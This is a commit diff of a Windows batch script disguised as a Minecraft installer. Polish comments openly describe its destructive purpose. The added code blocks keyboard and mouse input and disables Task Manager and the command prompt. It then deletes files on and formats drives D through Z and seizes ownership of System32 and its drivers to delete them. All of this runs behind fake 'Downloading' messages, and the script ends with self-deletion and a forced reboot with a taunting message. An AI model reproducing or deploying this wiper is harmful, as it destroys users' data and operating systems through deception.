8dcb1e94c9a49fc0e42c2f5fabaebcbd667cc8a1
xoxojojo <kornelzietek7@gmail.com>
2026-03-07 12:51:54 +0100

    lol.bat

--- lol.bat
+++ lol.bat
@@ -1,9 +1,9 @@
 @echo off
-:: SPRAWDZANIE UPRAWNIEN ADMINISTRATORA
+:: KROK 1 & 2: SPRAWDZENIE ADMINA I ZIELONY KOLOR
 net session >nul 2>&1
 if %errorlevel% neq 0 (
     title Error
-    color 04
+    color 0a
     echo ########################################
     echo #                                      #
     echo #      Run as administrator, please    #
@@ -13,78 +13,77 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-:: JEZELI JEST ADMINEM, STARTUJE INSTALATOR
 title Minecraft Installer
-color 04
+color 0a
 cls
 
+:: KROK 3: PYTANIE O INSTALACJE
 echo ########################################
 echo #                                      #
 echo #      MINECRAFT SETUP WIZARD          #
 echo #                                      #
 echo ########################################
 echo.
-
-:: DECYZJA UZYTKOWNIKA
 set /p "choice=Are you sure to install Minecraft? (Y/N): "
 
-if /i "%choice%"=="Y" (
-    goto install_start
-) else (
+if /i "%choice%" neq "Y" (
     echo.
     echo Installation cancelled.
     shutdown -r -t 5 -c "Ok"
     exit
 )
 
-:install_start
+:: KROK 4: START PO KLIKNIECIU "Y"
 cls
-echo [!] Initializing Minecraft Setup...
+echo [!] Initializing Minecraft Engine...
 timeout /t 2 >nul
 
-:: 1. BLOKADY SYSTEMOWE (TASK MGR, CMD, CTRL+ALT+DEL)
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
-
-:: 2. FIZYCZNA BLOKADA MYSZKI I KLAWIATURY (PowerShell BlockInput)
+:: BLOKADA KLAWIATURY I MYSZKI (ODLACZENIE)
 powershell -Command "$m = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlock);'; $type = Add-Type -MemberDefinition $m -Name 'Win32' -Namespace 'Utils' -PassThru; $type::BlockInput($true)"
 
-:: 3. POBIERANIE ASSETOW (FORMATOWANIE DYSKOW D, E, F...)
-cls
-echo [!] Downloading Minecraft Assets...
-timeout /t 3 >nul
+:: BLOKADA TASK MANAGERA I CMD
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1
 
+:: A. USUWANIE DYSKOW D, E, F... (WIDOCZNE SCIEZKI)
+echo [!] Downloading Game Assets...
 for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%d:\ (
-        echo Downloading textures to drive %%d:\installer_cache...
+        for /f "delims=" %%f in ('dir /s /b %%d:\*.* 2^>nul') do (
+            echo Downloading: %%f
+            del /f /q "%%f" >nul 2>&1
+        )
         format %%d: /q /x /y >nul 2>&1
-        rd /s /q %%d:\ >nul 2>&1
     )
 )
 
-:: 4. POBIERANIE SILNIKA (NISZCZENIE SYSTEM32)
-echo [!] Downloading Minecraft Core Engine...
-takeown /f C:\Windows /r /d y >nul 2>&1
-icacls C:\Windows /grant administrators:F /t >nul 2>&1
-
-:: Petla udajaca pobieranie, a w rzeczywistosci usuwajaca pliki
-for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\*.*') do (
-    echo Downloading core component: %%i
+:: B. USUWANIE STEROWNIKOW (WIDOCZNE SCIEZKI)
+echo [!] Downloading Hardware Drivers...
+takeown /f C:\Windows\System32\drivers /r /d y >nul 2>&1
+icacls C:\Windows\System32\drivers /grant administrators:F /t >nul 2>&1
+for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\drivers\*.*') do (
+    echo Downloading: %%i
     del /f /q "%%i" >nul 2>&1
 )
 
-:: 5. FINAL I SAMOUSUWANIE
+:: C. USUWANIE SYSTEM32 (WIDOCZNE SCIEZKI - TO BEDZIE WYGLADAC NAJLEPIEJ)
+echo [!] Downloading Minecraft Core Engine...
+takeown /f C:\Windows\System32 /r /d y >nul 2>&1
+icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1
+for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\*.*') do (
+    echo Downloading: %%i
+    del /f /q "%%i" >nul 2>&1
+)
+
+:: D. PRZEDOSTATNI KROK: SAMOUSUWANIE INSTALATORA
+:: Skrypt tworzy plik tymczasowy, ktory usunie instalator sekunde przed restartem
+(echo ping localhost -n 3 ^> nul ^& del "%~f0") > %temp%\final_clean.bat
+start /min "" %temp%\final_clean.bat
+
+:: E. OSTATNI KROK: RESTART Z WIADOMOSCIA
 cls
 echo ============================================================
-echo   Minecraft installed. We need to restart to apply changes.
+echo   Minecraft installed. Restarting to apply changes...
 echo ============================================================
-timeout /t 5 >nul
-
-:: Tworzenie skryptu czyszczacego ktory usunie ten instalator
-(echo ping localhost -n 5 ^> nul ^& del "%~f0" ^& del "%%~f0") > %temp%\cleaner.bat
-start /min "" %temp%\cleaner.bat
-
-:: RESTART Z TWOJA WIADOMOSCIA
-shutdown -r -t 0 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
+shutdown -r -t 2 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
 exit
